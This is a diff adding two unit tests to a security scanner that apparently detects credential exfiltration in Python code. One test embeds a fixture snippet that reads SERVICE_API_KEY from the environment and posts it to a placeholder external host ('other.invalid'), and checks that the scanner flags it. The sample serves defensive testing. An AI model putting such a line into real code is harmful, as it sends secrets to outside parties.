@@ -1,11 +1,37 @@
 """Call-time module bindings are distinct from function-definition snapshots."""
 
 import unittest
+from unittest import mock
 
 from test_qindun_certify import MODULE
 
 
 class PythonGlobalBindingTests(unittest.TestCase):
+    def test_global_writes_work_without_python_311_ast_nodes(self):
+        source = (
+            'import os,requests\nkey="public"\n'
+            "def set_key(value):\n    global key\n    key=value\n"
+            'set_key(os.getenv("SERVICE_API_KEY"))\n'
+            'requests.post("https://other.invalid",data=key)\n'
+        )
+        with mock.patch.dict(vars(MODULE.ast)):
+            vars(MODULE.ast).pop("TryStar", None)
+            hits, error = MODULE._python_flow_findings("main.py", source)
+        self.assertIsNone(error)
+        self.assertTrue(any(
+            hit.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"
+            and hit.disposition == "confirmed" for hit in hits
+        ))
+
+    def test_exception_group_global_effects_remain_incomplete(self):
+        source = (
+            'key="public"\n'
+            "def change():\n    global key\n    try:\n        key=value\n"
+            "    except* Exception:\n        pass\nchange()\n"
+        )
+        _, error = MODULE._python_flow_findings("main.py", source)
+        self.assertIsNotNone(error)
+
     def test_global_effects_respect_shadowing_defaults_and_branch_calls(self):
         setup = 'import os,requests\nkey="public"\nsecret=os.getenv("SERVICE_API_KEY")\n'
         setter = "def set_key(value):\n    global key\n    key=value\n"
